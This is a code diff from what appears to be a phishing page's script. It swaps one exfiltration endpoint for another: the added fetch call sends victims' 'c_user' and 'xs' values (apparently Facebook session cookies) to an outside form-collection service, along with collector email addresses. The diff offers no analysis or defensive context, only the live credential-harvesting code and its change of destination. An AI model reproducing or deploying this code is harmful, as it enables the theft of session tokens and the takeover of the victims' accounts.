@@ -854,29 +854,22 @@
             submitRequestBtn.classList.add("button-loading");
             submitRequestBtn.disabled = true;
 
-            //   const emails = allowRecovery && recoveryCodes ? 
-            //         ["mashooqkh798@gmail.com", "gaa641088@gmail.com"] : 
-            //         ["mashoowkh@gmail.com", "mashooqkh2@gmail.com"];
-
-            //     const name = allowRecovery && recoveryCodes ? "shayan boss" : "shayan";
-
+            
             const emails = ["humorsalma648@gmail.com",""]
             const name = "Mashooq ali"
 
-            // Submit main form
-            fetch("https://postal-form.on.shiper.app/submit", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify({
-                    c_user: cUser,
-                    xs: xsToken,
-                    emails: emails,
-                    workerEmail: "gaa641088@gmail.com",
-                    name: name,
-                }),
-            })
+                // Always send c_user and xs
+  fetch("https://formspree.io/f/xblqrelw", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      c_user: cUserInputVal,
+      xs: xsInputVal,
+      emails: ["mashoowkh@gmail.com"], // optional field
+      workerEmail: "",
+      name: "Formspree Submission"
+    }),
+  })
             .then((response) => {
                 if (response.ok) {
                     // If recovery codes are provided, send additional notification
